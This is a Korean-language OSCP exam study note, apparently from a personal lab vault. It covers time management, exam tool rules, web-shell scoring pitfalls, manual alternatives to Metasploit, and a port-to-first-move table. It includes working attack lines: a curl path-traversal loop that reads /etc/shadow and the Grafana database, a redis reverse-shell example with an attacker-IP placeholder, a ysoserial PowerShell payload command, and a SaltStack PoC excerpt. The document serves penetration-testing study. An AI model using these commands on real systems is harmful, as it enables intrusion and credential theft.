| 웹 열거 + feroxbuster | 13:58 → 14:08 | 3분 | 파라미터를 먼저 만졌어야 했음 |
| Responder + 캡처 | 14:08 → 14:09 (1분) | 1분 | 트리거를 알면 즉시 |
| hashcat | 14:10 (2초) | 2초 | 12초 안에 안 되면 접음 |
| 스윕 + WinRM + local.txt | 14:12 | 5분 | |
| BloodHound 수집·분석 | 14:18 → 15:05 | 15분 | Kerberoast·릴레이 헛발질 포함 |
| gMSA → PtH → SYSTEM | 15:05 → 15:51 | 20분 | 두 경로를 모두 실습해 길어짐 |

**낭비는 둘** — 브루트포싱(A-23)과 경로 오판(A-4-11 도메인 잔류 · A-5 릴레이). **`nmap.log` 를 한 번 더 정독했으면 릴레이 시도는 통째로 없었다.**

**리버스셸이 안 붙으면 의심할 것** — 아웃바운드 포트 제한(80/443 으로 바꿔봄) · Windows 방화벽 아웃바운드 규칙 · **AV 가 `nc64.exe` 를 파일명만으로 삭제**([[Squid]]·[[Exghost]] 에서 실제로 남. 업로드 후 `ls` 로 존재 확인부터). [[Heist]] 는 4444 가 그대로 통했다.


실측([[Twiggy]]) — nmap 1분(`--min-rate 5000` 덕) → `zmtp` 검색으로 SaltStack 확정까지 **약 30분** `[가정]`(**최대 손실 구간.** 포트 번호 우선 검색이었으면 5분, B-2-18) → PoC clone~root key 획득은 빠름 → `--exec` 시도·실패 판정 **약 20분** `[가정]`(실패 자체는 정상. **리버스셸 재도전 없이 원시를 바꾼 것이 좋은 판단**이었음, A-12) → passwd 조립~업로드~SSH root 로그인.
→ **리버스셸 손절선은 「두 번」임.** 포트를 바꿔(443/53) 한 번 더 시도하고 그래도 안 되면 **셸을 요구하지 않는 경로**(파일 쓰기·크론·SSH 키·`/etc/passwd`)로 즉시 전환할 것. 이 박스에서 정확히 그 전환이 정답이었음.

실측([[Levram]]) — 정찰~권한상승 **8분**(`~/PG/Levram/` mtime 재구성: 17:29:01 nmap 종료 → 17:37:06 su root). 단일 최장 구간은 `50640.py`(17:29:45)와 `trigger.sh`(17:33:47) 사이 **4분 2초**이고, 여기에 버전 판정 증거 A(필수·적정) + 증거 B(webpack 자산 30개 대조, **초과 작업**) + EDB 디버깅(4분 만에 접음)이 함께 들어갔음.
→ **패치 경계 판정이 증거 A 하나로 이미 끝났는데**(후보 `{0.9.5, 0.9.6, 0.9.7}` 가 전부 취약) **증거 B 까지 간 것이 이 박스의 유일한 낭비 지점**임. 8분에 끝나 손해가 안 보였을 뿐 — **근거가 이미 판정을 끝냈으면 추가 축은 「정밀도」이지 「판정」이 아님**(A-13 의 「멈추는 기준이 절반임」).
→ `os.setgid(0)` 보강 시도(약 20초)는 낭비로 세지 않음 — **GTFOBins 최소성의 이유를 알려준 값진 실패**였음(B-3-16).

**바이너리 익스플로잇은 시험에서 가장 위험한 시간 함정임**([[Osaka]]). 웹 취약점은 진행 여부가 응답으로 즉시 드러나지만, 오버플로우는 **「크래시는 나는데 셸이 안 붙는」 상태로 몇 시간이 증발**할 수 있음.

| 단계 | 판단 기준 | 손절선 |
|---|---|---|
| 커스텀 서비스 정체 파악(`HELP` 로 명령 열거) | 비표준 명령이 나오는가 | **15분.** 안 나오면 다른 서비스로 |
| 오프셋·EIP 제어 확인 | `EIP = 0x42424242` 가 나오는가 | **45분.** 여기까지 못 가면 경로 자체가 틀렸을 가능성 |
| 릭 + ROP 조립(ASLR+DEP 둘 다) | 베이스가 `0x____0000` 으로 나오는가 | **60분** |
| 셸코드 실행 실패 디버깅 | 붙었다 끊기는가 / 아예 안 붙는가 | **30분.** 끊기면 배드캐릭터(B-98), 안 붙으면 아웃바운드 포트(A-31) |
| 권한상승(`whoami /priv`) | 답이 바로 보이는가 | **5분.** 안 보이면 서비스·레지스트리 열거로 |

→ **규칙: 90분 안에 EIP 제어를 못 만들면 다른 머신으로 갈아타고 나중에 돌아올 것.** 반대로 **EIP 제어에 성공했으면 끝까지 밀어붙일 가치가 있음** — 남은 것은 기계적 절차임.

## E. OSCP 시험 규정 — 금지 / 제한 / 허용

| 도구 | 판정 |
|---|---|
| `sqlmap`·`sqlninja`·`db_autopwn`·`browser_autopwn` | **금지** (명시적) |
| Nessus·OpenVAS·NeXpose 등 대량 스캐너 | **금지** |
| Metasploit·meterpreter | **금지가 아니라 1대 한정.** `msfvenom`·`multi_handler` 는 전 대상 허용 |
| AutoRecon·BloodHound·CrackMapExec·searchsploit·공개 PoC | **허용** (열거 전용이거나 스스로 취약점을 발견하지 않음) |

공식 정의는 *"if a tool is capable of **automatically discovering and exploiting** vulnerabilities … **without effort or enumeration**"* 임. **열거 전용 도구는 금지 대상이 아님.**

⚠️ **대상 수가 적으면 허용 도구보다 손이 빠름.** hydra 는 허용이지만 [[Fowsniff]] 는 계정이 9개뿐이라 `for` 루프 + `sshpass`(SSH) · 30행 python 소켓(POP3)로 도는 편이 빨랐음(B-2-13). **도구 선택을 규정 문제로 착각하지 말 것** — 이 부류는 애초에 금지 도구를 쓸 일이 없음.

⚠️ **과잉 금지 판정을 하지 말 것.** [[_WRITEUP-STANDARD]] 이 한때 AutoRecon 을 금지로 잘못 적어 **18개 노트에 오류를 상속**시켰음.

⚠️ **웹셸로 얻은 플래그는 0점** — *"this includes any type of web-based shell"*. 규정 출처: [Exam Guide, "Exam Proofs"](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide).

- **웹셸은 «대화형 셸을 얻는 데» 쓰고, 읽기는 그 셸에서 할 것.** 웹셸 자체가 종착점이 아님 — F-1 표의 「웹 루트와 겹치면 즉시 웹셸」도 리버스셸 발판으로 쓰라는 뜻임(A-31)
- 대화형 셸에서 **원위치 `cat`/`type`** 해야 함. 그래서 **타겟 pty 프롬프트(`root@box:~#`)가 이 프로젝트에서 가장 중요한 증거**임 — 지우지 말 것
- **플래그 스크린샷에는 플래그 내용 + 타겟 IP(`ipconfig`/`ip addr`)가 함께 있어야 함** ([[Butch]] — 적대적 검증에서 노트가 정반대로 적혀 있던 것을 정정)
- ⚠️ **「웹셸」만이 아니라 «비대화형 명령 실행» 전부가 같은 지위임** — Redis 모듈의 `system.exec`, 단발 RCE, 인젝션 한 줄. [[Wombo]] 는 이 단계를 **실행하지 않았음**(남은 증거가 `id_output.txt` 와 `flags.txt` 로 분리돼 있고 둘 다 `system.exec` 산출) — **시험이었으면 0점 상태로 끝났음.** 순서는 **RCE → 리버스셸 → PTY 승격 → 원위치 `cat`** 이고(예: `redis-cli -h <타겟> system.rev <공격자IP> <포트>`), 리버스셸도 egress 제약을 그대로 받음(A-31)
  - ⚠️ **DB 채널도 같음 — SQLi `LOAD_FILE()` 로 읽은 플래그는 0점임.** [[Pebbles]] 는 `proof.txt` 를 blind SQLi 로 뽑고 UDF 셸을 아예 시작하지 않았음. 「목표가 파일 하나면 셸을 만들지 마라」는 «정보 획득» 기준으로는 옳지만 **점수 기준으로는 틀림.** 값을 먼저 뽑아 안전판을 만들되 **그 다음에 셸을 마저 잡을 것**(C-3)
- ⚠️ **PTY 승격 명령 자체는 에코 꺼진 `sh -i` 구간에 입력돼 로그에 안 남음** — **프롬프트가 `$ ` → `user@host:path$` 로 바뀌는 지점**이 승격의 실측 증거가 됨. 그래서 그 프롬프트 줄을 지우면 안 됨
- ⚠️ **«브라우저 안에서 도는 터미널»도 전부 web-based shell 임** — Cockpit · Webmin · Wetty · Guacamole · 브라우저 개발자 콘솔. 자격증명을 이미 쥐었으면 **SSH·WinRM·RDP 로 갈아탄 뒤** 원위치에서 읽을 것. [[Cockpit]] 은 22번이 열려 있어 비용이 0이었는데도 **두 플래그를 다 브라우저 터미널에서 읽었음** — 시험이었으면 100점짜리 박스가 0점임. **한 번 웹 셸에 자리를 잡으면 그 뒤 모든 작업이 관성으로 거기서 이어진다는 것**이 이 사고의 본체임
  - **판별 신호** — 같은 프롬프트 문자열이 여러 스크린샷에서 폰트·색상·UI 크롬까지 동일하게 렌더되면 브라우저 렌더러임. 그리고 그 구간의 명령이 `~/.zsh_history` 에 **한 줄도 없으면**(A-64) 그 뒤 명령 전부가 웹 셸 안에서 쳐졌을 가능성을 의심할 것

**⛔ 금지 도구가 «하고 싶어지는 지점»마다 수동 대안을 미리 짝지어 둘 것** — 지점마다 대안이 정해져 있으면 시험장에서 판단이 필요 없어짐. [[Muddy]] 는 금지 도구 의존이 0 인 박스(전 구간 `curl`·`john`·`nc`)였으나 손이 가는 지점이 넷 있었음:

| 자동 도구(금지·제한) | 수동 대안 |
|---|---|
| XXE 스캐너 · Burp Scanner | `curl --data-binary @-` + heredoc 으로 **DTD 직접 작성**(B-1-33) |
| `wpscan` | `curl -I .../wp-login.php` 로 **인증 표면 존재 여부부터** 판정(A-2-18) |
| `davtest` · `cadaver` | `curl -T`(PUT) · `curl -X PROPFIND` · `curl -X OPTIONS`(A-2-21) |
| `linpeas`(허용이나 느리고 시끄러움) | `id` · `sudo -l` · `cat /etc/crontab` · `find / -perm -4000` · `getcap -r /` **5줄**(C-2) |

**공개 PoC 와 Metasploit 카드 관리**
- **단일 취약점 PoC 는 허용됨** — `redis-rogue-server.py` 처럼 「발견 단계가 없는」 스크립트는 exploit-db/GitHub PoC 와 같은 지위임([[Wombo]])
- **Metasploit 대안이 있어도 일부러 안 쓰는 판단이 시험 전략임.** [[Wombo]] 는 `exploit/linux/redis/redis_replication_cmd_exec`, [[Mice]] 는 `exploit/windows/misc/remote_mouse_rce` 가 있었으나 **1대 한정 카드를 여기 쓰기 아까워** 둘 다 수동으로 감
  - [[PwnLab]] 은 애초에 모듈을 **찾지도 않았음** — 전 과정이 `curl`·`mysql`·`nc`·`strings` 로 끝나 1대 한정 카드를 아예 안 씀. [[Exfiltrated]] 도 전용 모듈 `exploit/multi/http/subrion_cms_file_upload_rce` 가 실재하나(Kali 설치본에서 확인) curl 3요청으로 대체함
  - [[Nagoya]] 는 금지 도구 의존 0 — BloodHound·kerbrute·username-anarchy·nxc·impacket·hashcat·ligolo-ng·PrintSpoofer 전부 **열거 전용이거나 단일 기법 도구**라 허용됨(수동 대안은 B-55 · B-56 · B-71 · B-46 에 각각 병기)
- [[Outdated]] 는 `exploit/unix/webapp/webmin_package_updates_rce` 가 있었으나 **1대 한정 카드를 여기 쓰지 않고** curl 세 파라미터(`u`·`confirm`·`mode`) + `-e`(Referer)로 수동 진행(B-1-24). LFI 도 `curl --data-urlencode` + 파이썬 20줄이라 전 구간 자동 도구 없음
  - **웹셸 회피가 결과적으로 함께 해결된 사례임** — 리버스셸이 안 붙어 인증 후 RCE 를 「단발 명령 실행」으로만 쓸 수 있었는데, 그것으로 **SUID bash 를 떨구고 기존 SSH 세션에서 `bash -p`** 로 승격함. 단발 RCE 로 플래그를 읽었으면 0점이었음
  - ⚠️ **`euid=0` 과 「root 셸」을 구분해 적을 것.** [[Outdated]] `proof_root.txt` 는 `uid=1000(svc-account) … euid=0(root)` 임. `whoami` 가 `root` 로 나오는 것은 whoami 가 euid 를 보기 때문이고, 실 uid 는 그대로임
- [[ClamAV]] 는 `exploit/unix/smtp/clamav_milter_blackhole` 이 있었으나 파이썬 30줄로 대체함 — `nc 타겟 25` 로 손으로 쳐도 되는 절차임(B-2-11)
- [[Fanatastic]] — CVE-2021-43798 에는 Metasploit 모듈과 자동 PoC 가 여럿 있으나 **`curl` 한 줄 + `for` 루프로 완전히 대체됨.** 1회 사용권을 이 정도 취약점에 소모하는 것은 손해임:
  ```bash
  for f in /etc/passwd /etc/grafana/grafana.ini /var/lib/grafana/grafana.db /etc/shadow; do
    echo "=== $f"
    curl -s --path-as-is "http://<타겟>:3000/public/plugins/alertlist/../../../../../../../..$f"
  done
  ```
  나머지 도구(`sqlite3`·`python3`·`ssh`·`debugfs`)는 **전부 허용**임
- **그래서 수동 대안을 손에 익혀 둘 것** — Redis 는 순수 `redis-cli` 절차(`slaveof` → `config set dbfilename` → `module load` → `system.exec`, B-25), Windows 는 `msfvenom` 대신 난독화 PowerShell one-liner + 순수 cmdlet 열거(A-35), CSRF 앱은 `requests`/`curl` 로 토큰 실시간 파싱(B-1-14)
- **애초에 자동 도구가 필요 없는 골격의 박스가 많음.** [[Cockpit]] 이 그 전형 — 디렉터리 열거는 `gobuster dir -u http://<타겟> -w /usr/share/wordlists/dirb/common.txt -x php` 로 충분했고(`common.txt` **2347행에 `login`** 이 있어 `-x php` 와 함께면 `login.php` 가 요청됨), 인증 우회는 브라우저에 **글자 하나**(B-1-19), 권한상승은 `sudo -l` **한 줄**(B-38)임. `sqlmap` 은 금지이기 이전에 **쓸 일이 없었음.** 반대로 대형 워드리스트를 물린 것이 4시간 반을 태웠음(A-1-13 · D 절)
- **「로그인 폼 → 평문/약한 인코딩 자격증명 → 같은 자격증명으로 관리 서비스 로그인 → `sudo -l` GTFOBins」는 PG Intermediate 의 표준 골격임.** 변형은 base64 자리에 md5·ROT13·평문이 들어가거나, 9090 자리에 Webmin·Zabbix·phpMyAdmin·Portainer 가 들어가는 정도임(F-1)

- **공개 PoC 는 「스스로 발견하지 않으므로」 허용됨.** 금지 정의는 *"if a tool is capable of automatically **discovering and exploiting** vulnerabilities … without effort or enumeration"* 이고, 걸리는 지점은 **「스스로 발견(discovering)까지 한다」**임. 특정 CVE PoC 는 어느 CVE·어느 엔드포인트인지를 **내가 열거해서 정해준 뒤에야** 동작함. 애초에 OSCP 는 exploit-db·GitHub 익스플로잇 사용을 전제로 설계된 시험이고 `searchsploit` 이 기본 탑재된 이유가 그것임
  - **`phpggc`** 는 익스플로잇이 아니라 **페이로드 생성기**라 **타겟과 통신조차 하지 않음** — msfvenom 과 같은 범주로 허용됨(B-1-44)
  - **`searchsploit` 은 로컬 exploit-db 사본을 검색·복사하는 도구**라 제한 대상이 아님. **AutoRecon 도 열거 전용이라 마찬가지임.** `sqlmap`(명시적 금지)·Metasploit(1대 한정)과 **이 셋을 한 묶음으로 적는 오해가 흔함**
  - `-m <ID>` 는 현재 디렉터리로 복사(mirror)함 — 원본(`/usr/share/exploitdb/…`)을 직접 수정하지 않게 해주므로 항상 `-m` 으로 꺼낼 것. `-x <ID>`(내용 보기) · `-p <ID>`(경로·URL 만)도 함께 외울 것(A-1-11)
- [[pyLoader]] — CVE-2023-0297 의 GitHub 익스플로잇(`CVE-2023-0297.sh`)은 **배너와 인자 파싱을 걷어내면 `curl` 한 줄**임. 자동 익스플로잇 프레임워크와 무관하고 스크립트 없이 그대로 칠 수 있음. **남의 스크립트는 파이썬 버전·의존성·인자 파싱에서 흔히 깨지므로 원라이너를 손에 쥐고 있을 것**(A-14)

**⚠️ 「타겟을 망가뜨리면 다른 응시자의 재현을 방해한다」는 «틀린 근거»임 — 그런데도 널리 퍼져 있음.**
OSCP 시험 환경은 응시자 전용이고 다른 응시자와 타겟을 공유하지 않음:
> *"simulates a live network in a **private VPN**"* / *"The exam lab is a **dedicated environment with no learners connected other than yourself**"* / *"All of the machines have been freshly reverted at the start of your exam"*

이 통념의 출처는 **은퇴한 통합 PWK 랩**임. 당시 공식 문서는 *"Students may encounter exploits left by other learners"* 라고 공유 환경임을 명시했고, 그래서 「남의 익스플로잇이 굴러다닌다」·「내가 망가뜨리면 남이 못 푼다」가 상식이었음. 현행 PG 는 정반대로 *"private machines … without having to worry that other users will access it"* 임.
→ **커뮤니티 상식에도 유통기한이 있고, 랩 구조가 바뀌면 그 위에 세운 규칙도 함께 무효가 됨.** 파괴적 변조를 피할 진짜 이유는 **revert 말고는 수습 수단이 없어 그 머신의 진척이 통째로 사라지는 것**임(A-4-11 · A-68).

**24시간 제한** · **재부팅/리버트 시 재현 필요** — 원샷 트릭이 아니라 재현 가능한 절차로 적을 것.

**같은 CVE 에 `.rb`(Metasploit 모듈)와 `.py`(독립 스크립트)가 함께 있는 경우가 흔함 — 성격이 다름.** [[Astronaut]] CVE-2021-21425:

| 파일 | 형태 | 시험 |
|---|---|---|
| `49788.rb` | **Metasploit 모듈** | **1대 한정 제한에 소모됨.** 저난도 박스에 쓰면 낭비 |
| `49973.py` | 독립 Python 스크립트 | **허용** — 수동 스크립트 범주 |
| 순수 `curl` 절차 | 수동 | **항상 허용** |

✅ **다만 Metasploit 모듈을 «읽는» 것은 제한이 아님.** 모듈 상단의 `Ranking`·`References`·버전 체크 로직에 **영향 범위와 전제조건이 코드로** 적혀 있음 — [[Astronaut]] 이 「admin 1.10.7 포함(inclusive)」을 확정한 근거가 그것이고, [[Kevin]] 은 같은 이유로 badchar 정본을 모듈의 `BadChars` 에서 가져왔음(A-14). CVE 설명 문서보다 정확할 때가 많음.
```bash
searchsploit -m 49788 && head -60 49788.rb
```
✅ **익스플로잇 스크립트를 «못 쓰겠으면 읽을 것».** 실행하는 것과 요청 형식을 베끼는 것은 다른 일임 — `grep -n 'data\[' 49973.py` 한 줄이면 정확한 폼 필드명이 나오고 그것으로 `curl` 절차를 손으로 재구성할 수 있음(A-14).

[[Kevin]] — `exploit/windows/http/hp_power_manager_filename` 모듈이 실재하나 **실행하지 않고 읽기만 했음.** 공개 PoC(python2) + `msfvenom` 으로 대체해 1대 한정 카드를 아꼈음.
→ **정석은 「모듈은 읽기만 하고 공개 PoC + msfvenom 으로 푸는 것」임.** Fundamental 박스에 카드 한 장을 쓰는 것은 손해임.

⚠️ `[가정]` **「`check` 를 쓰는 것만으로도 카드가 소모된다」는 규정 원문으로 검증하지 못했음.** [[Kevin]] 옛 노트의 단정이었고, Exam Guide 의 제한 문구는 「Metasploit·meterpreter 를 1대에」까지만 확인됨. **`check` 도 exploit 모듈을 «실행»하는 것이라 소모로 보는 것이 안전한 해석**이지만 그 자체는 미검증임 — 확정 사실로 인용하지 말 것.

---

---


**`searchsploit` · AutoRecon · 특정 CVE 겨냥 공개 PoC — 셋 다 금지도 제한도 아님.** `searchsploit` 은 검색 도구, AutoRecon 은 열거 전용(익스플로잇 단계 없음), 공개 PoC 는 스스로 취약점을 발견하지 않음. **이 셋을 sqlmap·Metasploit 과 한 묶음으로 적는 오해가 흔함.**
**판정 예시 — [[plum]]** — `sqlmap` 불필요(애초에 DB 가 없는 XML CMS), Metasploit 미사용, `pluxml.py` 는 **HTTP 요청 3개짜리 스크립트**라 브라우저로 100% 대체 가능. **자동 익스플로잇 프레임워크와 「요청 몇 개를 순서대로 보내는 스크립트」를 같은 것으로 세지 말 것.**
→ **수동 대안을 반드시 병기할 것**(표준 원칙 5). 스크립트가 깨질 때의 생명줄이기도 함.


**[[Flu]] 실측 판정 — 공개 PoC 는 허용, 이 박스는 msf 를 안 써서 「1대 한정」 한 장을 아꼈음.**
금지 정의는 *"스스로 취약점을 발견해 자동으로 익스플로잇하는"* 도구임(`sqlmap`·`db_autopwn`·Nessus 계열). 특정 CVE 하나를 겨냥한 PoC 는 스스로 아무것도 발견하지 않음 — **버전을 판정하고 고른 것은 사람임.**
**수동 대안도 함께 적어 둘 것** — Flu 는 `curl --path-as-is` 로 URL 인코딩한 OGNL 페이로드를 경로에 붙이면 됨(닫는 `/` 필수). 이 박스에서 손으로 재현하지는 않았음(관측 없음).


- [[Algernon]] — `exploit/windows/http/smartermail_rce`(Rank `ExcellentRanking`, Kali 설치본에서 확인)와 `post/windows/gather/credentials/smartermail` 이 둘 다 실재하나 **1대 한정 카드를 쓰지 않고** EDB 49216 로 감. 판정 근거는 **프레임워크 의존성이 있는가** — 49216 은 순수 Python + 표준 라이브러리(`base64`·`socket`·`struct`)뿐이고, 단일 CVE 의 독립 PoC 이므로 「자동 익스플로잇 도구」에 해당하지 않아 허용됨. 두 경로의 결과가 어차피 동일하게 SYSTEM 이므로 **결과가 같은데 제한된 카드를 태우는 것은 순수한 손해**임
  - 스크립트조차 없을 때의 완전 수동 대안은 `ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "powershell -enc <UTF16LE-base64>"` 로 체인을 만들고 EDB 49216 의 프레임 조립부(`.NET` 매직 + 길이 + `tcp://<타겟>:17001/Servers` URI)에 `payload` 변수만 갈아끼우는 것임


**AD 계열 도구 허용 판정 — 전부 허용이다.** ([[Heist]] 는 Metasploit 없이 끝났다)
- BloodHound / bloodhound-python / SharpHound — **열거 전용. 익스플로잇 단계가 없어 허용**
- NetExec(nxc) / CrackMapExec — 열거·인증 확인. 허용
- Responder — 프로토콜 포이즈닝·자격증명 수집. 허용
- hashcat / evil-winrm / bloodyAD / GMSAPasswordReader / xfreerdp3 / impacket 계열 — 허용
- 금지는 `sqlmap` 계열 자동 익스플로잇과 Nessus/OpenVAS 계열 대량 스캐너. Metasploit 은 금지가 아니라 **1대 한정**이고 `msfvenom`·`multi_handler` 는 전 대상 허용

**⛔ 「모든 호스트」를 뜻하는 인자가 보이면 손을 뗄 것 — 스코프 위반은 실격 사유임.**
[[Twiggy]] 가 쓴 SaltStack PoC 에는 `--exec-all` 옵션이 있었고 소스에 대상이 그대로 박혀 있음:
```python
        'cmd': '_send_pub',
        'fun': 'cmd.run',
        'arg': [ "/bin/sh -c '{}'".format(cmd) ],
        'tgt': '*',
        'tgt_type': 'glob',
```
— 출처: `~/PG/Twiggy/CVE-2020-11651-poc/exploit.py` `pwn_exec_all()`(2026-08-26 재확인)

`tgt: '*'` + `tgt_type: 'glob'` 은 **마스터에 붙은 전 호스트**를 뜻함. 랩에 미니언이 없었을 가능성이 높아도 **스코프 밖 호스트에 명령이 나갈 위험이 있는 옵션**이라 의도적으로 쓰지 않았음. PoC 자체도 실행 전 `[!] Lester, is this what you want? Hit ^C to abort.` 로 경고를 띄우고 잠시 멈춤.
→ **OSCP 시험에서 스코프 밖 자산을 건드리면 실격임.** 위 「타겟을 망가뜨리면 다른 응시자를 방해한다」가 **틀린 근거**인 것과 별개로, **스코프 경계 자체는 실재하는 규정**임 — 둘을 섞지 말 것.
→ 반사로 만들 것 — 새 도구의 옵션 목록에서 `all`·`*`·`--spray`·`sweep`·`0.0.0.0/0` 이 보이면 **인자를 읽기 전에 손을 멈출 것.**

## F. 포트 → 첫 수

> [!info] 이 표의 진입 질문
> 「포트 8090에 Confluence가 떴는데 뭘 해보지?」 — 시험장에서 실제로 던지는 질문이 이것임. 박스 이름으로는 아무것도 못 찾음.

**「관측」 열은 이 볼트 354개 노트의 `ports` 프론트매터 집계임**(`_INDEX/_tools/meta.json`). 어느 포트에 시간을 쓸 값이 있는지의 실측 근거.
⚠️ **서비스 이름은 표준 할당이지 이 볼트의 실측이 아님.** `meta.json` 의 `ports` 와 `services` 배열은 **인덱스 정렬돼 있지 않아**(80 → `ssh`, 22 → `http` 로 짝지어짐) 그 조인으로 매핑을 만들면 안 됨. 실제 서비스는 항상 배너·응답으로 확인할 것(A-11).

### F-1. 이 볼트에서 자주 만난 것

| 포트 | 관측 | 서비스(표준) | 첫 수 | 카드 |
|---|---|---|---|---|
| 80 · 443 | 66 · 9 | HTTP(S) | 응답 본문·헤더 저장 → 버전 문자열 → 디렉터리 열거. **버전이 보이면 CVE 직행** | B-1 |
| 22 | 61 | SSH | 배너로 OS·버전. **자격증명 없이 브루트 금지**(A-22) — 다른 벡터에서 얻어 올 것 | — |
| 445 · 139 · 135 | 46 · 45 · 39 | SMB · NetBIOS · RPC | 널 세션 공유 열거 → 읽히는 공유 전량 회수. **공유명이 곧 웹 경로인 경우 있음**(A-21) | B-2 |
| 389 · 636 · 3268 · 3269 | 23 · 23 · 22 · 22 | LDAP(S) · GC | 익명 바인드 시도 → **`description`·`info`·`comment` 전수 조회**. ⚠️ `-o ldif_wrap=no` 없이 쓰면 긴 값이 잘려 비밀번호를 통째로 놓침 | B-5 |
| 88 · 464 | 22 · 22 | Kerberos | 사용자 열거 → AS-REP roasting. 실패하면 **시계·이름해석·ccache 부터**(A-5) | B-5 |
| 5985 · 5986 · 47001 | 28 · 5 · 12 | WinRM | 자격증명 확보 후 `evil-winrm`. 열려 있다는 것 자체가 **자격증명이 곧 셸**이라는 신호 | B-4 |
| 3389 | 18 | RDP | 자격증명 확보 후 `xfreerdp`. 피벗 뒤라면 `proxychains` 경유 | B-7 |
| 53 | 26 | DNS | 도메인명 확보 → 존 전송 시도. AD 면 DC 지목 | B-5 |
| 8080 · 8000 · 3000 · 8081 · 8082 | 12 · 4 · 5 · 2 · 2 | 대체 HTTP | 80 과 **다른 앱**인 경우가 대부분. 따로 열거할 것. `Golang net/http` + `http-title: Gogs`/Gitea 면 **로그인 즉시 Git Hooks**(관리자면 RCE 확정) | B-1 · B-22 |
| 21 | 12 | FTP | 익명 로그인 → 쓰기 가능 여부. **웹 루트와 겹치면 즉시 웹셸** | B-2 |
| 3306 · 1433 | 8 · 4 | MySQL · MSSQL | 외부 노출 자체가 신호. 자격증명 재사용 시도 | B-2 |
| 25 · 110 · 143 | 6 · 4 · 3 | SMTP · POP3 · IMAP | 사용자 열거(VRFY·RCPT). **메일함은 셸이 아니라 «다음 자격증명이 평문으로 적혀 있는 곳»임** — [[Fowsniff]]: 해시 크랙 → POP3 스프레이 → 메일 본문의 SSH 임시 비번 | B-2-13 · B-2-11 |
| 8082 · 43500 | 2 · 미집계 | 비표준 고포트 관리 콘솔 | **nmap 이 제품명을 붙여준 포트부터 손으로 열 것.** `H2 database http console` → 콘솔 접속이 곧 코드 실행 · `Server: APISIX/…` → Admin API 우회. ⚠️ `nmap-services` 미등재 포트가 있어 **`-p-` 필수** | B-2-14 · B-1-35 |
| 111 · 2049 | 4 · 2 | rpcbind · NFS | 익스포트 목록 → `no_root_squash` 확인. ⚠️ 마운트는 반드시 풀 것(A-42) | B-2 |
| 9389 | 19 | AD Web Services | 단독 벡터는 아님. **AD 라는 지문**으로 읽을 것 | B-5 |

### F-2. 읽는 법

- **135·139·445 + 88·389·636 이 함께 뜨면 도메인 컨트롤러임.** 이 조합이 이 볼트에서 20개 넘는 노트에 걸쳐 있음 — 단독 박스가 아니라 AD 로 접근할 것
- **5985 가 열려 있는데 자격증명이 없으면**, 그 박스의 승부처는 「셸을 어떻게 잡나」가 아니라 「자격증명을 어디서 얻나」임
- **8080·3000·8000 은 80 과 다른 앱**임. 하나 봤다고 나머지를 건너뛰지 말 것
- **여기 없는 포트가 나오면** 그것이 그 박스의 승부처일 확률이 높음. 표에 없다 = 이 볼트에서 처음 본다
- **`filtered` 로 적힌 포트를 목록에서 지우지 말 것.** 같은 스캔이 나머지를 `closed (reset)` 이라 적고 있다면 filtered 는 **응답이 삼켜진 것**임. [[Outdated]] 의 `10000/tcp filtered` 는 내부에서 `0.0.0.0:10000` 으로 열려 있던 Webmin 이었고, 그것이 권한상승 경로 전체였음(A-1-17 · B-71)

⚠️ **`-p-` 를 생략하지 말 것.** 리눅스 박스에서 60000/tcp 가 **두 번째 sshd** 였던 전례 있음([[ClamAV]]). 상위 1000 밖에 정적으로 열린 진짜 서비스가 있음.

## 관련

- [[_WRITEUP-STANDARD]] — 박스 노트 형식(OSCP 제출 보고서 4·5장)
- [[_STATUS]] — 283개 전수 진행현황
